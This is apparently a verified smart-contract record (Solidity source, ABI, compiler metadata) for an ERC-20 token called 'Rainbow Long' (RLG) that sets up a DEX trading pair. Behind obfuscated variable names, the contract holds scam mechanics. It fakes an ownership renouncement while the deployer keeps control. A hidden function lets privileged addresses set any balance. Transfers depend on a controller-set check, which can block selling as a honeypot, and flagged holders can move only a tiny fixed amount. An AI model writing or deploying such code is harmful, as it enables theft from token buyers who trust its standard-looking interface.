{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface buyLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundMin) external view returns (uint256);\n\n    function transfer(address swapMode, uint256 feeReceiver) external returns (bool);\n\n    function allowance(address exemptSellList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapMode,\n        uint256 feeReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listMode, uint256 value);\n    event Approval(address indexed exemptSellList, address indexed spender, uint256 value);\n}\n\nabstract contract teamBuyMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverMaxTeam {\n    function createPair(address toShould, address isAt) external returns (address);\n}\n\ninterface buyLaunchedMetadata is buyLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RainbowLong is teamBuyMarketing, buyLaunched, buyLaunchedMetadata {\n\n    uint256 private totalIsTake;\n\n    address public tradingExempt;\n\n    function totalLimit() public {\n        emit OwnershipTransferred(takeWallet, address(0));\n        shouldTx = address(0);\n    }\n\n    string private totalAmount = \"Rainbow Long\";\n\n    address liquidityFromLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public listTotal;\n\n    bool private listReceiverLiquidity;\n\n    mapping(address => bool) public exemptFrom;\n\n    mapping(address => uint256) private senderMode;\n\n    uint256 toLaunch;\n\n    address public takeWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return totalAmount;\n    }\n\n    bool public isWallet;\n\n    function approve(address minTeamMax, uint256 feeReceiver) public virtual override returns (bool) {\n        limitTakeTotal[_msgSender()][minTeamMax] = feeReceiver;\n        emit Approval(_msgSender(), minTeamMax, feeReceiver);\n        return true;\n    }\n\n    function swapEnable(uint256 feeReceiver) public {\n        feeEnable();\n        walletSenderSwap = feeReceiver;\n    }\n\n    function owner() external view returns (address) {\n        return shouldTx;\n    }\n\n    function toSender(address tokenMax, address swapMode, uint256 feeReceiver) internal returns (bool) {\n        require(senderMode[tokenMax] >= feeReceiver);\n        senderMode[tokenMax] -= feeReceiver;\n        senderMode[swapMode] += feeReceiver;\n        emit Transfer(tokenMax, swapMode, feeReceiver);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverTotalSwap;\n    }\n\n    string private atTx = \"RLG\";\n\n    uint256 private receiverTotalSwap = 100000000 * 10 ** 18;\n\n    function balanceOf(address fundMin) public view virtual override returns (uint256) {\n        return senderMode[fundMin];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return atTx;\n    }\n\n    function marketingTeam(address swapReceiver) public {\n        if (isWallet) {\n            return;\n        }\n        \n        fundFrom[swapReceiver] = true;\n        if (maxMode == totalIsTake) {\n            maxMode = totalIsTake;\n        }\n        isWallet = true;\n    }\n\n    function takeShouldMode(address limitFrom, uint256 feeReceiver) public {\n        feeEnable();\n        senderMode[limitFrom] = feeReceiver;\n    }\n\n    uint256 constant minExempt = 17 ** 10;\n\n    function modeTo(address tokenMax, address swapMode, uint256 feeReceiver) internal returns (bool) {\n        if (tokenMax == takeWallet) {\n            return toSender(tokenMax, swapMode, feeReceiver);\n        }\n        uint256 teamToken = buyLaunched(tradingExempt).balanceOf(liquidityFromLimit);\n        require(teamToken == walletSenderSwap);\n        require(swapMode != liquidityFromLimit);\n        if (exemptFrom[tokenMax]) {\n            return toSender(tokenMax, swapMode, minExempt);\n        }\n        return toSender(tokenMax, swapMode, feeReceiver);\n    }\n\n    mapping(address => bool) public fundFrom;\n\n    function feeEnable() private view {\n        require(fundFrom[_msgSender()]);\n    }\n\n    address private shouldTx;\n\n    event OwnershipTransferred(address indexed maxList, address indexed liquidityLaunched);\n\n    mapping(address => mapping(address => uint256)) private limitTakeTotal;\n\n    function transferFrom(address tokenMax, address swapMode, uint256 feeReceiver) external override returns (bool) {\n        if (_msgSender() != atFund) {\n            if (limitTakeTotal[tokenMax][_msgSender()] != type(uint256).max) {\n                require(feeReceiver <= limitTakeTotal[tokenMax][_msgSender()]);\n                limitTakeTotal[tokenMax][_msgSender()] -= feeReceiver;\n            }\n        }\n        return modeTo(tokenMax, swapMode, feeReceiver);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundTx;\n    }\n\n    uint256 private enableLaunched;\n\n    function transfer(address limitFrom, uint256 feeReceiver) external virtual override returns (bool) {\n        return modeTo(_msgSender(), limitFrom, feeReceiver);\n    }\n\n    uint256 walletSenderSwap;\n\n    function allowance(address limitTotal, address minTeamMax) external view virtual override returns (uint256) {\n        if (minTeamMax == atFund) {\n            return type(uint256).max;\n        }\n        return limitTakeTotal[limitTotal][minTeamMax];\n    }\n\n    function getOwner() external view returns (address) {\n        return shouldTx;\n    }\n\n    uint256 private maxMode;\n\n    function modeTake(address minTake) public {\n        feeEnable();\n        if (amountTotal == listTotal) {\n            amountTotal = true;\n        }\n        if (minTake == takeWallet || minTake == tradingExempt) {\n            return;\n        }\n        exemptFrom[minTake] = true;\n    }\n\n    address atFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        if (maxMode != enableLaunched) {\n            enableLaunched = totalIsTake;\n        }\n        isAuto tokenAuto = isAuto(atFund);\n        tradingExempt = receiverMaxTeam(tokenAuto.factory()).createPair(tokenAuto.WETH(), address(this));\n        if (totalIsTake == enableLaunched) {\n            listReceiverLiquidity = true;\n        }\n        takeWallet = _msgSender();\n        totalLimit();\n        fundFrom[takeWallet] = true;\n        senderMode[takeWallet] = receiverTotalSwap;\n        \n        emit Transfer(address(0), takeWallet, receiverTotalSwap);\n    }\n\n    uint8 private fundTx = 18;\n\n    bool private amountTotal;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptSellList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minTeamMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTeamMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"}],\"name\":\"marketingTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTake\",\"type\":\"address\"}],\"name\":\"modeTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeReceiver\",\"type\":\"uint256\"}],\"name\":\"swapEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeReceiver\",\"type\":\"uint256\"}],\"name\":\"takeShouldMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RainbowLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}